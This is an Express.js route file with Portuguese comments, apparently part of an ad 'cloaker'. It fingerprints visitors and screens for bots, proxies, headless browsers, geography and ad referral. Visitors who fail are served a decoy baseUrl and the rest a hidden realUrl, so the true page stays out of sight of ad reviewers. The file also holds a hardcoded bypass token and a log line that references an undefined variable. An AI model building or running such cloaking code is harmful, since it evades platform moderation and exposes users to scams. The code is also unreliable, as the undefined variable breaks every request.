const express = require('express');
const router = express.Router();
const axios = require('axios');
const Fingerprint = require('../models/Fingerprint');
const {
  isGeoAllowed,
  isProxyDetected,
  isHeadless,
  isAccessTimeValid
} = require('../utils/securityChecks');
const Domain = require('../models/Domain');

// Página pública /:slug
router.get('/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    const domain = await Domain.findOne({ slug });
    if (!domain) return res.status(404).send('Página não encontrada');

    const userAgent = req.headers['user-agent'] || '';
    const ref = req.get('referer') || '';
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const { fp, token } = req.query;

    // ⚠️ Checagens desligadas pra teste
    const fromAd = true;
    const geoOk = true;
    const timeOk = true;
    const proxy = false;
    const headless = false;
    const isBotCheck = false;


    const exists = await Fingerprint.findOne({ fp, ip, userAgent });
    const trusted = exists || (token === 'chave-compartilhamento-segura');

    const blocked = isBotCheck || !fromAd || headless || proxy || !geoOk || !timeOk;

    // 🔍 Debug no console
    console.log("🩻 Checagem visitante:", { isBot, fromAd, headless, proxy, geoOk, timeOk, trusted });

    const targetUrl = (blocked && !trusted)
      ? domain.baseUrl
      : domain.realUrl;

    if (!exists && fp && !blocked) {
      await Fingerprint.create({ fp, ip, userAgent, validado: true, dataValidado: new Date() });
    } else if (exists && !exists.validado && !blocked) {
      exists.validado = true;
      exists.dataValidado = new Date();
      await exists.save();
    }

    const response = await axios.get(targetUrl, {
      headers: {
        'User-Agent': userAgent,
        'X-Forwarded-For': ip,
        'Referer': ref
      }
    });

    res.send(response.data);

  } catch (err) {
    console.error("❌ Erro em render.routes:", err.message);
    return res.status(500).send('Erro interno no cloaker');
  }
});

module.exports = router;
